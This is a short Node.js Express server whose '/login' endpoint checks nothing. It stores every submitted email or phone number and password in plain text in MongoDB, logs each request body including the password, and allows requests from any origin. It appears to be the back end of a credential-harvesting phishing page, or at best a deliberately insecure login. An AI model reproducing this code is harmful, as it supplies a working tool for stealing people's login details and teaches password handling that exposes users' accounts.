const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const cors = require("cors");
require("dotenv").config();

// Initialize app
const app = express();
const PORT = process.env.PORT || 3000;
const DataB = process.env.DATAB;

// Middleware
app.use(bodyParser.json());
app.use(cors());

// Connect to MongoDB
mongoose
  .connect(DataB, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("Connected to MongoDB"))
  .catch((error) => console.error("MongoDB connection error:", error));

// Define schema
const userSchema = new mongoose.Schema({
  email: { type: String, required: true }, // Email or phone number
  password: { type: String, required: true }, // Plain-text password
  createdAt: { type: Date, default: Date.now },
});

// Define model
const User = mongoose.model("User", userSchema);

// Login Endpoint (Save email and password in DB)
app.post("/login", async (req, res) => {
  console.log("Login request received:", req.body);
  const { email, password } = req.body;

  // Check if both fields are provided
  if (!email || !password) {
    return res
      .status(400)
      .json({ message: "Email and password are required." });
  }

  try {
    // Save the email and password to the database
    const newUser = new User({ email, password });
    await newUser.save();

    return res.status(201).json({ message: "Credentials saved successfully." });
  } catch (error) {
    return res
      .status(500)
      .json({ message: "Internal Server Error", error: error.message });
  }
});

// Home route for testing
app.get("/", (req, res) => {
  res.send("Server is running...");
});

// 404 for undefined routes
app.use((req, res) => {
  res.status(404).json({ message: "Route not found" });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
